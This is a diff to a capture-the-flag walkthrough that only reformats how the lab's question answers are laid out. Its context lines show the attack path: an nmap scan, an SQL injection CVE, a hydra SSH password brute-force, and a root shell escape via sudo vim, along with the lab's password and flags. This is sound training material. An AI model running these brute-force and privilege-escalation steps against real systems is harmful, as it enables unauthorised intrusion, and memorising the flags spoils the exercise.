@@ -13,10 +13,12 @@ nmap -sV -sC -Pn 10.128.134.213 -p-
 From our results, we can see ports 21 (FTP), 80 (HTTP), and 2222 (SSH) are open.
 
 > How many services are running under port 1000?
-> Answer: 2
+> 
+> 2
 
 > What is running on the higher port?
-> Answer: SSH
+> 
+> SSH
 
 Because port 80 (HTTP) is open, let’s try the target IP in a web browser.
 
@@ -33,10 +35,12 @@ After browse it, we can see the site is powered by `CMS Made Simple` with `versi
 We could see the version matches to a SQL injection vulnerability.
 
 > What’s the CVE you’re using against the application?
-> Answer: CVE-2019–9053
+> 
+> CVE-2019–9053
 
 > To what kind of vulnerability is the application vulnerable?
-> Answer: SQLi
+> 
+> SQLi
 
 After downloading the exploit.
 
@@ -68,10 +72,12 @@ hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.128.134.213:2222/
 ```
 
 > What’s the password?
-> Answer: secret
+> 
+> secret
 
 > Where can you login with the details obtained?
-> Answer: SSH
+> 
+> SSH
 
 ```shell
 ssh mitch@10.128.134.213 -p 2222
@@ -92,7 +98,8 @@ G00d j0b, keep up!
 ```
 
 > What’s the user flag?
-> Answer: G00d j0b, keep up!
+> 
+> G00d j0b, keep up!
 
 Now let's see the users on the system.
 
@@ -105,7 +112,8 @@ mitch  sunbath
 ```
 
 > Is there any other user in the home directory? What’s its name?
-> Answer: sunbath
+> 
+> sunbath
 
 Now let's try if we can be root.
 
@@ -126,7 +134,8 @@ sudo vim -c ':!/bin/sh'
 ```
 
 > What can you leverage to spawn a privileged shell?
-> Answer: vim
+> 
+> vim
 
 ```shell
 whoami
@@ -143,5 +152,6 @@ W3ll###############
 ```
 
 > What's the root flag?
-> Answer: W3ll###############
+> 
+> W3ll###############
 
